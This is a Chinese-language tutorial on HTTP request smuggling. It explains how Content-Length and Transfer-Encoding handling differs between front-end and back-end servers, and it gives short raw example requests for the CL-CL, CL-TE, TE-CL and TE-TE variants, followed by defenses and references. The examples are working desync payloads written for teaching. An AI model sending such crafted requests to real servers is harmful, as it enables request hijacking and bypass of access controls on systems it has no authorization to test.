HTTP 请求走私
========================================

简介
----------------------------------------
HTTP请求走私是一种干扰网站处理HTTP请求序列方式的技术。 

成因
----------------------------------------
请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 ``Content-Length`` 和 ``Transfer-Encoding`` 标头。

分类
----------------------------------------
- CLTE：前端服务器使用 ``Content-Length`` 头，后端服务器使用 ``Transfer-Encoding`` 头
- TECL：前端服务器使用 ``Transfer-Encoding`` 标头，后端服务器使用 ``Content-Length`` 标头。
- TETE：前端和后端服务器都支持 ``Transfer-Encoding`` 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。

攻击
----------------------------------------

CL不为0的GET请求
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 ``Content-Length`` 头，不进行处理。例如下面这个例子：

::

    GET / HTTP/1.1\r\n
    Host: example.com\r\n
    Content-Length: 44\r\n

    GET /secret HTTP/1.1\r\n
    Host: example.com\r\n
    \r\n

前端服务器处理了 ``Content-Length`` ，而后端服务器没有处理 ``Content-Length`` ，基于pipeline机制认为这是两个独立的请求，就造成了漏洞的发生。

CL-CL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
根据RFC 7230，当服务器收到的请求中包含两个 ``Content-Length`` ，而且两者的值不同时，需要返回400错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 ``Content-Length`` 值时，就会出现漏洞。例如：

::

    POST / HTTP/1.1\r\n
    Host: example.com\r\n
    Content-Length: 8\r\n
    Content-Length: 7\r\n

    12345\r\n
    a

这个例子中a就会被带入下一个请求，变为 ``aGET / HTTP/1.1\r\n`` 。

CL-TE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CL-TE指前端服务器处理 ``Content-Length`` 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 ``Content-Length`` ，处理 ``Transfer-Encoding`` 。例如：

::

    POST / HTTP/1.1\r\n
    Host: example.com\r\n
    ...
    Connection: keep-alive\r\n
    Content-Length: 6\r\n
    Transfer-Encoding: chunked\r\n
    \r\n
    0\r\n
    \r\n
    a

这个例子中a同样会被带入下一个请求，变为 ``aGET / HTTP/1.1\r\n`` 。

TE-CL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
TE-CL指前端服务器处理 ``Transfer-Encoding`` 请求头，而后端服务器处理 ``Content-Length`` 请求头。例如：

::

    POST / HTTP/1.1\r\n
    Host: example.com\r\n
    ...
    Content-Length: 4\r\n
    Transfer-Encoding: chunked\r\n
    \r\n
    12\r\n
    aPOST / HTTP/1.1\r\n
    \r\n
    0\r\n
    \r\n

TE-TE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
TE-TE指前后端服务器都处理 ``Transfer-Encoding`` 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 ``Transfer-encoding`` ，测试例如：

::

    POST / HTTP/1.1\r\n
    Host: example.com\r\n
    ...
    Content-length: 4\r\n
    Transfer-Encoding: chunked\r\n
    Transfer-encoding: cow\r\n
    \r\n
    5c\r\n
    aPOST / HTTP/1.1\r\n
    Content-Type: application/x-www-form-urlencoded\r\n
    Content-Length: 15\r\n
    \r\n
    x=1\r\n
    0\r\n
    \r\n

防御
----------------------------------------
- 禁用后端连接重用
- 确保连接中的所有服务器具有相同的配置
- 拒绝有二义性的请求

参考链接
----------------------------------------
- `HTTP Request Smuggling by chaiml <https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf>`_
- `HTTP request smuggling by portswigger <https://portswigger.net/web-security/request-smuggling>`_
- `RFC 2616 Hypertext Transfer Protocol -- HTTP/1.1 <https://tools.ietf.org/html/rfc2616>`_
- `RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing -- HTTP/1.1 <https://tools.ietf.org/html/rfc7230>`_
- `从一道题到协议层攻击之HTTP请求走私  <https://xz.aliyun.com/t/6654>`_
